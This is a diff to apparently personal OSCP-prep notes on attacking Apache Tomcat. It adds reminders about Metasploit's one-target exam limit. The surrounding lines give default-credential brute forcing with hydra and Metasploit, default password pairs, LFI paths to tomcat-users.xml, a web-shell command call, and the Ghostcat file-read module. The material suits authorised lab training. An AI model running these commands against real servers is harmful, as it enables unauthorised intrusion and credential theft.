@@ -11,6 +11,7 @@ curl -sk -o /dev/null -w '%{http_code}\n' <Scheme>://<WebHost>/host-manager/html
 
 ## Manager credentials
 hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt <Scheme>-get://<WebHost>/manager/html
+- [ ] OSCP one-target limit: this Metasploit auxiliary module spends my one target, even if it fails
 msfconsole -q -x 'use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS <TargetIP>; set RPORT <Port>; run'
 - [ ] By hand: tomcat:s3cret, admin:admin, tomcat:tomcat, admin:tomcat, both:tomcat
 - [ ] Through an LFI: conf/tomcat-users.xml, under /opt/tomcat, /usr/share/tomcat9, /var/lib/tomcat9 or /etc/tomcat9
@@ -39,6 +40,7 @@ curl -sk '<Scheme>://<WebHost>/cmd/?cmd=id'
 
 ## Ghostcat, AJP on 8009
 - [ ] Tomcat before 9.0.31, 8.5.51 or 7.0.100, with 8009 reachable: CVE-2020-1938 reads files inside the web app
+- [ ] OSCP one-target limit: this Metasploit auxiliary module spends my one target, even if it fails
 msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <TargetIP>; set FILENAME /WEB-INF/web.xml; run'
 - [ ] web.xml read for credentials and the names of other files to read the same way
 
